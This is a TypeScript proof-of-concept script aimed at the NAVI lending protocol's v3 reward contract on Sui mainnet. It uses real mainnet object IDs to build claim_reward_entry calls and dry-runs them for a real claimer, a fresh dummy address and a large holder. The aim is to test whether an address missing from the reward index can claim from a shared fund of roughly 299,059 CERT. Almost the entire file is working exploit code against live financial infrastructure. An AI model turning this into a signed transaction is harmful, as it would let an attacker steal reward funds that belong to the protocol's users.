/**
 * NAVI v3 claim_reward_entry — vulnerability dry-run PoC
 * Uses exact arg encoding from a real transaction to ensure correctness.
 */

import { SuiClient } from "@mysten/sui/client";
import { Transaction } from "@mysten/sui/transactions";
import { bcs } from "@mysten/sui/bcs";

const client = new SuiClient({ url: "https://fullnode.mainnet.sui.io:443" });

const CLOCK = "0x0000000000000000000000000000000000000000000000000000000000000006";
const INCENTIVE_V3 = "0x62982dad27fb10bb314b3384d5de8d2ac2d72ab2dbeae5d801dbdb9efa816c80";
const STORAGE = "0xbb4e2f4b6205c2e2a2db47aeb4f830796ec7c005f88537ee775986639bc442fe";
const REWARD_FUND_CERT = "0x7093cf7549d5e5b35bfde2177223d1050f71655c7f676a5e610ee70eb4d93b5c";
const PKG = "0xee0041239b89564ce870a7dec5ddc5d114367ab94a1137e90aa0633cb76518e0"; // current PROTO_PKG
const CERT_TYPE = "0x549e8b69270defbfafd4f94e17ec44cdbdd99820b33bda2278dea3b9a32d3f55::cert::CERT";
const CERT_RULE_1 = "0xda416fe656205ece152240771fe58b301d0c9a0ae43817b7f0cc0faa2742a60e";
const CERT_RULE_2 = "0xae82946d6cae4d5e7a779325394959fd7c2505405de71b2c01a2aac6ec3ab9da";
const USDC_TYPE = "0xdba34672e30cb065b1f93e3ab55318768fd6fef66c15942c9f7cb846e2f900e7::usdc::USDC";

const DUMMY = "0x0000000000000000000000000000000000000000000000000000000000001337";
const REAL_CLAIMER = "0x374e0ef6e83118c22735dbb34d6c762b7bf26197757b6918086bedb65310fab3";
const NAVI_WHALE = "0x7861f12c652dbcf96589413cf5cbc5ebcccd85c2c9f09c25fee76f2a218195c9";

function encodeVecAsciiString(strings: string[]): Uint8Array {
  // BCS: vector<ascii::String> where ascii::String has bytes: vector<u8>
  // BCS serialization: ULEB128 length, then each element
  return bcs.vector(bcs.string()).serialize(strings).toBytes();
}

function encodeVecAddress(addresses: string[]): Uint8Array {
  // Remove 0x prefix, then 32 bytes per address
  const addrs = addresses.map(a => {
    const hex = a.replace("0x", "").padStart(64, "0");
    const bytes = new Uint8Array(32);
    for (let i = 0; i < 32; i++) bytes[i] = parseInt(hex.slice(i * 2, i * 2 + 2), 16);
    return bytes;
  });
  // BCS vector: ULEB128 count + concatenated elements
  const result = new Uint8Array(1 + addrs.length * 32);
  result[0] = addrs.length;  // simple length (assumes < 128)
  for (let i = 0; i < addrs.length; i++) result.set(addrs[i], 1 + i * 32);
  return result;
}

async function checkUserIndex(user: string) {
  const iv3 = await client.getObject({ id: INCENTIVE_V3, options: { showContent: true } });
  const pools = (iv3.data?.content as any)?.fields?.pools?.fields?.contents ?? [];
  for (const pool of pools) {
    const key = String(pool?.fields?.key ?? "");
    if (key.includes("549e8b69")) {
      const rules = pool?.fields?.value?.fields?.rules?.fields?.contents ?? [];
      for (const r of rules) {
        if (r?.fields?.key === CERT_RULE_1) {
          const tableId = r?.fields?.value?.fields?.user_index?.fields?.id?.id;
          try {
            const entry = await client.getDynamicFieldObject({ parentId: tableId, name: { type: "address", value: user } });
            return (entry.data?.content as any)?.fields?.value ?? "FOUND_BUT_NO_VALUE";
          } catch {
            return "NOT_IN_TABLE → defaults to 0";
          }
        }
      }
    }
  }
  return "RULE_NOT_FOUND";
}

async function testClaim(sender: string, label: string) {
  console.log(`\n=== ${label} ===`);
  console.log(`  Sender: ${sender.slice(0, 24)}...`);

  const idx = await checkUserIndex(sender);
  console.log(`  user_index[CERT_RULE_1]: ${idx}`);

  const tx = new Transaction();
  tx.setSender(sender);

  // Use BCS-encoded pure values
  const coinTypesBytes = encodeVecAsciiString([CERT_TYPE, USDC_TYPE]);
  const ruleIdsBytes = encodeVecAddress([CERT_RULE_1, CERT_RULE_2]);

  tx.moveCall({
    target: `${PKG}::incentive_v3::claim_reward_entry`,
    typeArguments: [CERT_TYPE],
    arguments: [
      tx.object(CLOCK),
      tx.object(INCENTIVE_V3),
      tx.object(STORAGE),
      tx.object(REWARD_FUND_CERT),
      tx.pure(coinTypesBytes),
      tx.pure(ruleIdsBytes),
    ],
  });

  const r = await client.devInspectTransactionBlock({ transactionBlock: tx, sender });
  const status = r.effects?.status?.status;
  const error = r.effects?.status?.error ?? "";

  console.log(`  Status: ${status}`);
  if (status === "success") {
    const events = r.events?.filter((e: any) => e.type.includes("RewardClaimed")) ?? [];
    if (events.length > 0) {
      const pj = events[0].parsedJson as any;
      console.log(`  ✅ RewardClaimed: user=${pj.user?.slice(0,24)} claimed=${pj.total_claimed}`);
      console.log(`     rule_indices: ${JSON.stringify(pj.rule_indices)}`);
    } else {
      console.log("  ✅ call succeeded (no events)");
    }
  } else {
    console.log(`  Error: ${error.slice(0, 200)}`);
    const fn = error.match(/function_name: Some\("([^"]+)"\)/)?.[1];
    const code = error.match(/}, (\d+)\)/)?.[1];
    if (fn) console.log(`  → aborted in ${fn}() code=${code}`);
    if (error.includes("version")) console.log("  → VERSION GUARD fires ✓");
  }
}

async function main() {
  console.log("=".repeat(62));
  console.log("  NAVI v3 claim_reward_entry — Dry-Run PoC");
  console.log("  RewardFund<CERT> is SHARED — balance: ~299,059 CERT");
  console.log("=".repeat(62));

  await testClaim(REAL_CLAIMER, "Real claimer (verification baseline)");
  await testClaim(DUMMY, "DUMMY fresh address (user_index NOT in table)");
  await testClaim(NAVI_WHALE, "NAVI whale");
}
main().catch(console.error);
